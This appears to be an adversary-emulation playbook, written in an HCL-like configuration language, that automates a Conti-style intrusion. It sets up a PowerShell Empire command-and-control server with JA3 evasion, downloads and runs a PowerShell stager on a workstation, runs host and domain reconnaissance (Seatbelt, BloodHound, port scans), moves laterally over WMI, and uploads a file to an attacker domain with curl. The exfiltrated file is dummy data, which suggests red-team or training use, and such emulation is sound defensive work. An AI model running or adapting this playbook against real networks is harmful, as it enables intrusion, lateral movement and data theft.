# Conti Ransomware Playbook

local "function" "now" {
    function_name = "timestamp"
}

local "function" "date_stamp" {
    function_name       = "formatdate"
    function_parameters = ["%m_%d_%Y_%H_%M", local.function.now]
}

local "function" "stager_decode" {
    function_name       = "base64decode"
    function_parameters = [resource.task.c2_task.create_stager.Output]
}

variable "private_cidr" {
    description = "Private address range. Scanning modules will scan this IP range."
}

variable "domain_name" {
    description = "The domain name to be associated with the external facing listeners."
}

variable "exfil_file" {
    description = "File name to use for the exfil file."
    default     = "exfil_file.txt"
}

variable "exfil_path" {
    description = "Path where the exfil file will be generated and uploaded from."
    default     = "C:\\\\Users\\\\Public\\\\Downloads"
}

variable "exfil_size" {
    description = "Size of the exfil file to generate in megabytes."
    default     = "1000"
}

variable "scan_ports" {
    description = "Range of ports to be scanned by the port scan module."
    default     = "1-3500"
}

variable "initial_access_task_name" {
    description = "The name of the remote task where the C2 implant should run."
    default     = "workstation_host"
}

variable "lateral_movement_task_name" {
    description = "The name of the remote task that should be targeted by the lateral movement module."
    default     = "server_host"
}

data "tasks" "initial_access_task" {
  task_name = variable.initial_access_task_name
}

data "tasks" "lateral_movement_task" {
  task_name  = variable.lateral_movement_task_name
}

resource "random_string" "random_6" {
  length      = 6
  letters     = true
  digits      = false
  punctuation = false
  lower       = true
}

resource "random_string" "random_32" {
  length      = 32
  letters     = true
  digits      = true
  punctuation = false
}

resource "portgroup" "portgroup" {
    portgroup_name        = "portgroup_${local.function.date_stamp}"
    portgroup_description = "portgroup_${local.function.date_stamp}"
}

resource "portgroup_rule" "initial_access_task" {
    portgroup_name   = resource.portgroup.portgroup.portgroup_name
    portgroup_action = "add"
    ip_ranges        = "${data.tasks.initial_access_task.public_ip}/32"
    port             = "443"
    ip_protocol      = "tcp"
}

resource "portgroup_rule" "lateral_movement_task" {
    portgroup_name   = resource.portgroup.portgroup.portgroup_name
    portgroup_action = "add"
    ip_ranges        = "${data.tasks.lateral_movement_task.public_ip}/32"
    port             = "443"
    ip_protocol      = "tcp"
}

resource "task" "c2_task" {
    task_type       = "powershell_empire"
    task_name       = "c2_task_${local.function.date_stamp}"
    startup_actions = ["cert_gen","create_listener","create_stager"]

    cert_gen = {
        cert_type = "self-signed"
        cert_country = "US"
        cert_state = "California"
        cert_locale = "San Francisco"
        cert_org = "Havoc Inc."
        cert_org_unit = "IT Security"
        cert_host = "local_ip"
    }

    create_listener = {
        listener_type = "http_malleable"
        Name          = "http_malleable"
        Profile       = "trevor.profile"
        Host          = "https://c2-${resource.random_string.random_6.result}.${variable.domain_name}:443"
        Port          = "443"
        CertPath      = "/opt/Empire/empire/server/data/"
        StagingKey    = resource.random_string.random_32.result
        JA3_Evasion   = "True"
    }

    create_stager = {
        Listener      = "http_malleable"
        StagerName    = "multi/launcher"
        Language      = "powershell"
        StagerRetries = "60"
        OutFile       = "launcher.ps1"
    }
}

resource "listener" "c2_listener" {
    listener_name = "c2_listener_${local.function.date_stamp}"
    task_name     = resource.task.c2_task.task_name
    portgroups    = [resource.portgroup.portgroup.portgroup_name]
    host_name     = "c2-${resource.random_string.random_6.result}"
    domain_name   = variable.domain_name
    depends_on    = [resource.portgroup_rule.initial_access_task.portgroup_name,resource.portgroup_rule.lateral_movement_task.portgroup_name]

    listener_config = {
        443 = {
            listener_type = "HTTPS"
        }
    }
}

resource "task" "http_task" {
    task_type       = "http_server"
    task_name       = "http_task_${local.function.date_stamp}"
    startup_actions = ["cert_gen","create_listener"]

    cert_gen = {
        cert_type     = "self-signed"
        cert_country  = "US"
        cert_state    = "California"
        cert_locale   = "San Francisco"
        cert_org      = "Havoc Inc."
        cert_org_unit = "IT Security"
        cert_host     = "local_ip"
    }

    create_listener = {
        listener_type = "https"
        Port          = "443"
    }
}

resource "listener" "http_listener" {
    listener_name = "http_listener_${local.function.date_stamp}"
    task_name     = resource.task.http_task.task_name
    portgroups    = [resource.portgroup.portgroup.portgroup_name]
    host_name     = "downloads-${resource.random_string.random_6.result}"
    domain_name   = variable.domain_name
    depends_on    = [resource.portgroup_rule.initial_access_task.portgroup_name,resource.portgroup_rule.lateral_movement_task.portgroup_name]

    listener_config = {
        443 = {
            listener_type = "HTTPS"
        }
    }
}

resource "file" "stager_upload" {
    file_name     = resource.task.c2_task.create_stager.OutFile
    file_contents = local.function.stager_decode
}

action "task_action" "stager_download" {
    task_name = resource.task.http_task.task_name
    command   = "download_from_workspace"
    essential = "true"

    download_from_workspace = {
        file_name = resource.file.stager_upload.file_name
    }
}

action "task_action" "download_stager" {
    task_name    = data.tasks.initial_access_task.task_name
    command      = "task_download_file"
    essential    = "true"

    task_download_file = {
        url       = "https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}/${action.task_action.stager_download.download_from_workspace.file_name}"
        file_name = action.task_action.stager_download.download_from_workspace.file_name
    }
}

action "task_action" "execute_stager" {
    delay       = "180"
    timeout     = "900"
    depends_on  = resource.listener.c2_listener.listener_name
    task_name   = data.tasks.initial_access_task.task_name
    command     = "task_execute_command"
    essential   = "true"
    
    task_execute_command = {
        command = "powershell.exe arsenal\\${action.task_action.download_stager.task_download_file.file_name}"
    }

    action_function = {
        wait_for_c2 = {
            task_name = resource.task.c2_task.task_name
        }
    }
}

action "agent_action" "antivirusproduct" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/host/antivirusproduct"
        wait_for_results  = "true"
        completion_string = "completed"
    }
}

action "agent_action" "dnsserver" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.antivirusproduct
    
    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/host/dnsserver"
        wait_for_results  = "true"
        completion_string = "completed"
    }
}

action "agent_action" "get_proxy" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.dnsserver

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/host/get_proxy"
        wait_for_results  = "true"
        completion_string = "completed"
    }
}

action "agent_action" "get_uaclevel" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.get_proxy

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/host/get_uaclevel"
        wait_for_results  = "true"
        completion_string = "completed"
    }
}

action "agent_action" "seatbelt_user" {
    delay      = "15"
    timeout    = "300"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.get_uaclevel

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/host/seatbelt"
        wait_for_results  = "true"
        completion_string = "Completed"

        module_args = {
            Group        = "User"
            Full         = "False"
            Command      = ""
            Computername = ""
            Username     = ""
            Password     = ""
            Quiet        = ""
        }
    }
}

action "agent_action" "seatbelt_system" {
    delay      = "15"
    timeout    = "300"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.seatbelt_user

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/host/seatbelt"
        wait_for_results  = "true"
        completion_string = "Completed"
        
        module_args = {
            Group        = "System"
            Full         = "False"
            Command      = ""
            Computername = ""
            Username     = ""
            Password     = ""
            Quiet        = ""
        }
    }
}

action "agent_action" "reverse_dns" {
    delay      = "15"
    timeout    = "600"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.seatbelt_system

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/network/reverse_dns"
        wait_for_results  = "true"
        completion_string = "completed"

        module_args = {
            CIDR = variable.private_cidr
        }
    }
}

action "agent_action" "portscan" {
    delay      = "15"
    timeout    = "900"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.reverse_dns

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/network/portscan"
        wait_for_results  = "true"
        completion_string = "completed"

        module_args = {
            Hosts = variable.private_cidr
            Ports = variable.scan_ports
        }
    }
}

action "agent_action" "get_domain_controller" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.portscan

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
        wait_for_results  = "true"
        completion_string = "completed"
    }
}

action "agent_action" "get_domain_policy" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.get_domain_controller

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/network/powerview/get_domain_policy"
        wait_for_results  = "true"
        completion_string = "completed"
        
        module_args = {
            Policy = "Domain"
        }
    }
}

action "agent_action" "bloodhound" {
    delay      = "15"
    timeout    = "900"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.get_domain_policy

    execute_empire_agent_module = {
        module            = "powershell/situational_awareness/network/bloodhound"
        wait_for_results  = "true"
        completion_string = "completed"

        module_args = {
            CollectionMethod = "Default"
            Threads          = "20"
            Throttle         = "1000"
        }
    }
}

action "agent_action" "invoke_wmi" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_module"
    depends_on = action.agent_action.bloodhound

    execute_empire_agent_module = {
        module           = "powershell/lateral_movement/invoke_wmi"
        wait_for_results = "false"

        module_args = {
            ComputerName     = data.tasks.lateral_movement_task.local_ip.0
            Listener         = resource.task.c2_task.create_listener.Name
            Command          = ""
            CredID           = ""
            Obfuscate        = ""
            ObfuscateCommand = ""
            Bypasses         = ""
            UserName         = ""
            Password         = ""
            UserAgent        = ""
            Proxy            = ""
            ProxyCreds       = ""
        }
    }
}

action "agent_action" "create_exfil_file" {
    delay      = "15"
    timeout    = "300"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_shell_command"
    depends_on = action.agent_action.invoke_wmi

    execute_empire_agent_shell_command = {
        command          = "New-Item ${variable.exfil_path}\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){'1234567890qwertyasdfjkl;'*1048576 >> ${variable.exfil_path}\${variable.exfil_file}}"
        wait_for_results = "true"
    }
}

action "agent_action" "upload_exfil_file" {
    delay      = "180"
    timeout    = "600"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_shell_command"
    depends_on = action.agent_action.create_exfil_file

    execute_empire_agent_shell_command = {
        command          = "c:\Windows\System32\curl.exe -s -k -F files=@${variable.exfil_path}\${variable.exfil_file} https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}:443/upload; echo done"
        wait_for_results = "true"
    }
}

action "agent_action" "delete_exfil_file" {
    delay      = "15"
    timeout    = "180"
    task_name  = resource.task.c2_task.task_name
    agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
    command    = "execute_empire_agent_shell_command"
    depends_on = action.agent_action.upload_exfil_file

    execute_empire_agent_shell_command = {
        command          = "del ${variable.exfil_path}\${variable.exfil_file}"
        wait_for_results = "true"
    }
}

action "task_action" "list_files" {
    delay      = "15"
    timeout    = "180"
    task_name  = data.tasks.initial_access_task.task_name
    command    = "task_execute_command"
    depends_on = action.agent_action.delete_exfil_file

    task_execute_command = {
        command = "ls"
    }    
}
